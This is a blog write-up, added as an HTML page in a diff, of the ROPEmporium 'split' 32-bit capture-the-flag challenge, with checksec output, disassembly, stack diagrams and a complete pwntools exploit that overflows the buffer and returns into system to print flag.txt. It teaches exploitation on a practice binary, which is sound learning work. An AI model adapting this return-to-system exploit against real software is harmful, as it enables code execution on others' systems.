@@ -1,0 +1,162 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<title>ROPEmporium: split 32-bit | </title>
+<meta charset="utf-8">
+<meta name="generator" content="Hugo 0.80.0" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<link rel="stylesheet" href="https://cavetownie.github.io/css/index.css">
+<link rel="canonical" href="https://cavetownie.github.io/posts/split32bit/">
+<link rel="alternate" type="application/rss+xml" href="" title="">
+
+<header>
+  
+    <a href="https://cavetownie.github.io/" class="title"></a>
+  
+  
+    <nav>
+    
+      <a href="/">Blog</a>
+    
+      <a href="/about/">About</a>
+    
+      <a href="/challenges/">Challenges</a>
+    
+      <a href="/index.xml">RSS</a>
+    
+    </nav>
+  
+</header>
+
+<article>
+  <header>
+    <h1>ROPEmporium: split 32-bit</h1>
+    <time datetime="2021-05-24T14:38:00&#43;02:00">May 24, 2021</time>
+  </header>
+  <h1 id="writeup-of-split-split-on-ropemporium">Writeup of split [split] on ROPEmporium</h1>
+<p>Prerequisites: Basic knowledge of assembly, disassembling tools, and having solved ret2win for 32bit</p>
+<hr>
+<p>Let&rsquo;s start this time by checking the security settings of the binary with checksec.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cave@noobpwn:~/binexp/ROP-emperium/split_32$ checksec split32
+<span style="color:#f92672">[</span>*<span style="color:#f92672">]</span> <span style="color:#e6db74">&#39;/home/cave/binexp/ROP-emperium/split_32/split32&#39;</span>
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE <span style="color:#f92672">(</span>0x8048000<span style="color:#f92672">)</span>
+</code></pre></div><p>So NX is enabled, this means that we can&rsquo;t just put shellcode on the stack and return to it. NX is an exploit mitigation technique that marks memory regions as (N)on(X)ecutable. This means we can&rsquo;t just put a &ldquo;/bin/sh&rdquo; and jump to that, to get a shell. But again with ROP-emporium, we won&rsquo;t be getting a shell, instead we&rsquo;ll print the flag.txt file. So let&rsquo;s get started. This time around we&rsquo;ll be using the same tools as in &ldquo;ret2win&rdquo;. If you&rsquo;ve still not solved it, here are some hints, that doesn&rsquo;t give everything away:</p>
+<p>Can&rsquo;t use strings on the binary? Use rabin2 -z <!-- raw HTML omitted -->!
+Check the manpage for system, with &ldquo;man system&rdquo;</p>
+<p>Remember that system uses an argument on top of the stack (x86 ftw). If we do:
+payload += 0xdeadbeef
+This will push 0xdeadbeef to the top of the stack. Can you use that then?</p>
+<p>Okay let&rsquo;s continue now with spoilers.</p>
+<p>We&rsquo;ll start by checking the strings:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">cave@noobpwn:~/binexp/ROP-emperium/split_32$ rabin2 -z split32 
+<span style="color:#f92672">[</span>Strings<span style="color:#f92672">]</span>
+nth paddr      vaddr      len size section type  string
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――
+<span style="color:#ae81ff">4</span>   0x00000703 0x08048703 <span style="color:#ae81ff">10</span>  <span style="color:#ae81ff">11</span>   .rodata ascii Thank you!
+<span style="color:#ae81ff">5</span>   0x0000070e 0x0804870e <span style="color:#ae81ff">7</span>   <span style="color:#ae81ff">8</span>    .rodata ascii /bin/ls
+<span style="color:#ae81ff">0</span>   0x00001030 0x0804a030 <span style="color:#ae81ff">17</span>  <span style="color:#ae81ff">18</span>   .data   ascii /bin/cat flag.txt
+</code></pre></div><p>So we have a &ldquo;/bin/cat flag.txt&rdquo; in the data section of the program. If we run this command in the bash commandline, it will print the flag. Cool. Now if we look at the manpage for system:</p>
+<pre><code>system - execute a shell command
+</code></pre><p>Cool. So we need to take that string and give it to system, so that this is the command run by the program. Great. Well that&rsquo;s not so difficult. Now let&rsquo;s find the system call. Open the file with gdb, and use the info function command, to see the functions in the binary.</p>
+<pre><code class="language-assembly" data-lang="assembly">-pwndbg&gt; info functions
+All defined functions:
+
+Non-debugging symbols:
+0x08048374  _init
+0x080483b0  read@plt
+0x080483c0  printf@plt
+0x080483d0  puts@plt
+0x080483e0  system@plt
+0x08048546  main
+0x080485ad  pwnme
+0x0804860c  usefulFunction
+</code></pre><p>Another usefulFunction? Disassemble that.</p>
+<pre><code class="language-assembly" data-lang="assembly">pwndbg&gt; disass usefulFunction 
+Dump of assembler code for function usefulFunction:
+   0x0804860c &lt;+0&gt;:	push   ebp
+   0x0804860d &lt;+1&gt;:	mov    ebp,esp
+   0x0804860f &lt;+3&gt;:	sub    esp,0x8
+   0x08048612 &lt;+6&gt;:	sub    esp,0xc
+   0x08048615 &lt;+9&gt;:	push   0x804870e
+   0x0804861a &lt;+14&gt;:	call   0x80483e0 &lt;system@plt&gt;  &lt;--- found you!
+   0x0804861f &lt;+19&gt;:	add    esp,0x10
+   0x08048622 &lt;+22&gt;:	nop
+   0x08048623 &lt;+23&gt;:	leave  
+   0x08048624 &lt;+24&gt;:	ret    
+End of assembler dump.
+</code></pre><p>We need to understand that the stack is a LIFO data structure. Last In First Out. The system will use the argument that is the last in. So let&rsquo;s look at what happens when we call the system, this is just an example, and there might be more nuances in practical use.</p>
+<pre><code>┌────────────┐
+│            │
+│ rand addr  │ &lt;-- this is the top of the stack
+│            │     which will be called by system
+├────────────┤
+│            │
+│ rand addr  │
+│            │
+├────────────┤
+│            │
+│ rand addr  │
+│            │
+├────────────┤
+│            │
+│ rand addr  │
+│            │
+└────────────┘
+</code></pre><p>We can use this knowledge to craft a simple payload in python!</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">payload <span style="color:#f92672">=</span> A<span style="color:#f92672">*</span><span style="color:#ae81ff">44</span> <span style="color:#75715e">#(padding)</span>
+payload <span style="color:#f92672">+=</span> system <span style="color:#f92672">+</span> addr_catflag
+</code></pre></div><p>The stack will then look like this, at the time when we return to system:</p>
+<pre><code>┌────────────┐
+│            │ 
+│ *cat flag  │ &lt;- a pointer to the addr
+│            │    that holds the cat flag cmd
+├────────────┤
+│            │
+│ rand addr  │
+│            │
+├────────────┤
+│            │
+│ rand addr  │
+│            │
+└────────────┘
+</code></pre><p>Nice! Now you should have the knowledge to craft your own payload.</p>
+<p><strong>Conclusion: To call a function, like system we need to give it an argument. If no argument is provided by us, it will use the top of the stack. It&rsquo;s important to know, that without NX we would be able to write to the stack, and write a string like /bin/sh, and then we would get a shell. Since NX is enabled we have to use a string already present in the binary. Which we found in the beginning</strong></p>
+<p>Exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+elfPath<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;./split32&#34;</span>
+context<span style="color:#f92672">.</span>arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;i386&#34;</span>
+
+system <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804861a</span>) <span style="color:#75715e">#calls system</span>
+cat_flag <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0x0804a030</span>) <span style="color:#75715e">#/bin/cat flag.txt</span>
+
+
+gdbscript<span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;&#34;
+</span><span style="color:#e6db74">continue
+</span><span style="color:#e6db74">&#34;&#34;&#34;</span>
+
+terminalSetting <span style="color:#f92672">=</span> [<span style="color:#e6db74">&#39;gnome-terminal&#39;</span>, <span style="color:#e6db74">&#39;-e&#39;</span>]
+context<span style="color:#f92672">.</span>clear(terminal<span style="color:#f92672">=</span>terminalSetting)
+
+io <span style="color:#f92672">=</span> pwnlib<span style="color:#f92672">.</span>gdb<span style="color:#f92672">.</span>debug(elfPath, gdbscript <span style="color:#f92672">=</span> gdbscript)
+
+point<span style="color:#f92672">=</span>cyclic_find(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;laaa&#34;</span>, endian<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;little&#34;</span>)
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">main</span>():
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#34;&gt; &#34;</span>))
+
+    <span style="color:#75715e">#The reason for cat_flag to be after system is that system takes a pointer to a char buffer, </span>
+    <span style="color:#75715e">#the pointer is located in the esp</span>
+    <span style="color:#75715e">#We add the string, which is now the esp. Making system use it</span>
+    
+    <span style="color:#66d9ef">print</span>(io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span>point<span style="color:#f92672">+</span>system<span style="color:#f92672">+</span>cat_flag))
+    io<span style="color:#f92672">.</span>interactive() <span style="color:#75715e">#Interactive state</span>
+</code></pre></div>
+</article>
+
+
+
+</html>
